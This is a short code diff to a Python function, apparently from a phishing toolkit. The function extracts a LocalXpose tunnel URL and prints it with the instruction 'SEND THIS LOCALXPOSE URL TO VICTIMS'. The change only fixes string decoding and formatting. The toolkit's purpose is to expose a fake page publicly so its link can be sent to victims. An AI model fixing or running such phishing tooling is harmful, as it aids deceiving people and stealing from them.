@@ -280,9 +280,9 @@ def randomLocalxpose(port):
     try:
         output = check_output(
             "grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)
-        url = str(output).decode("utf-8")
-        print("\n{0}[{1}!{0}]{1} SEND THIS LOCALXPOSE URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALXPOSE URL: {2}".format(
-            MAIN0, MAIN4, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
+        url = str(output.decode('utf-8'))
+        print("\n{0}[{1}!{0}]{1} SEND THIS LOCALXPOSE URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALXPOSE URL: {2}{4}{1}".format(
+            MAIN0, MAIN4, MAIN3, port, url) + "{1}".format(MAIN0, MAIN4, MAIN3))
         print("\n")
     except CalledProcessError:
 
